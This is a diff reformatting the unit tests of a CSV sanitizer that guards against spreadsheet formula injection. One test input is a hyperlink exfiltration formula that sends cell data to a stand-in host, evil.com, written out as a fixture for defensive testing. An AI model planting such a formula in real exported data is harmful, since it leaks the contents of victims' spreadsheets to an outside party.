@@ -21,7 +21,9 @@ describe('CSV Sanitizer', () => {
         it('should return normal values unchanged', () => {
             expect(sanitizeCsvValue('Hello World')).toBe('Hello World');
             expect(sanitizeCsvValue('123')).toBe('123');
-            expect(sanitizeCsvValue('user@example.com')).toBe('user@example.com');
+            expect(sanitizeCsvValue('user@example.com')).toBe(
+                'user@example.com',
+            );
         });
 
         describe('formula injection prevention', () => {
@@ -64,7 +66,9 @@ describe('CSV Sanitizer', () => {
             expect(sanitizeCsvValue('hello=world')).toBe('hello=world');
             expect(sanitizeCsvValue('a+b')).toBe('a+b');
             expect(sanitizeCsvValue('a-b')).toBe('a-b');
-            expect(sanitizeCsvValue('test@example.com')).toBe('test@example.com');
+            expect(sanitizeCsvValue('test@example.com')).toBe(
+                'test@example.com',
+            );
         });
     });
 
@@ -79,7 +83,9 @@ describe('CSV Sanitizer', () => {
         });
 
         it('should wrap values containing quotes and escape them', () => {
-            expect(escapeCsvField('He said "Hello"')).toBe('"He said ""Hello"""');
+            expect(escapeCsvField('He said "Hello"')).toBe(
+                '"He said ""Hello"""',
+            );
         });
 
         it('should wrap values containing newlines in quotes', () => {
@@ -106,7 +112,7 @@ describe('CSV Sanitizer', () => {
 
         it('should handle values needing both sanitization and escaping', () => {
             expect(sanitizeAndEscapeCsvField('=Hello, World')).toBe(
-                "\"'=Hello, World\"",
+                '"\'=Hello, World"',
             );
         });
 
@@ -120,13 +126,13 @@ describe('CSV Sanitizer', () => {
             // Hyperlink exfiltration - sanitized and escaped (contains quotes)
             const hyperlinkPayload = '=HYPERLINK("http://evil.com?data="&A1)';
             expect(sanitizeAndEscapeCsvField(hyperlinkPayload)).toBe(
-                "\"'=HYPERLINK(\"\"http://evil.com?data=\"\"&A1)\"",
+                '"\'=HYPERLINK(""http://evil.com?data=""&A1)"',
             );
 
             // Payload with comma - needs both sanitize and escape
             const commaPayload = '=SUM(A1,A2)';
             expect(sanitizeAndEscapeCsvField(commaPayload)).toBe(
-                "\"'=SUM(A1,A2)\"",
+                '"\'=SUM(A1,A2)"',
             );
         });
     });
